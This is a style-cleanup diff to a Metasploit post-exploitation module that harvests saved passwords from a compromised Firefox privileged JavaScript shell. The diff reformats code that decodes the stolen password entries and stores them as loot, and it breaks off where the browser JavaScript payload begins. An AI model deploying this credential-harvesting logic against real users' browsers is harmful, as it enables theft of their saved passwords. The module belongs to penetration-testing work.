@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,24 +9,22 @@ require 'msf/core'
 require 'msf/core/payload/firefox'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Payload::Firefox
   include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Firefox Gather Passwords from Privileged Javascript Shell',
-      'Description'   => %q{
-        This module allows collection of passwords from a Firefox Privileged Javascript Shell.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'joev' ],
-      'DisclosureDate' => 'Apr 11 2014'
-    ))
+                      'Name'          => 'Firefox Gather Passwords from Privileged Javascript Shell',
+                      'Description'   => %q(
+                        This module allows collection of passwords from a Firefox Privileged Javascript Shell.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'joev' ],
+                      'DisclosureDate' => 'Apr 11 2014'))
 
     register_options([
-      OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
-    ], self.class)
+                       OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
+                     ], self.class)
   end
 
   def run
@@ -37,7 +36,7 @@ class MetasploitModule < Msf::Post
           entry.keys.each { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
         end
 
-        if passwords.length > 0
+        if !passwords.empty?
           file = store_loot("firefox.passwords.json", "text/json", rhost, passwords.to_json)
           print_good("Saved #{passwords.length} passwords to #{file}")
         else
@@ -50,7 +49,7 @@ class MetasploitModule < Msf::Post
   end
 
   def js_payload
-    %Q|
+    %|
       (function(send){
         try {
           var manager = Components
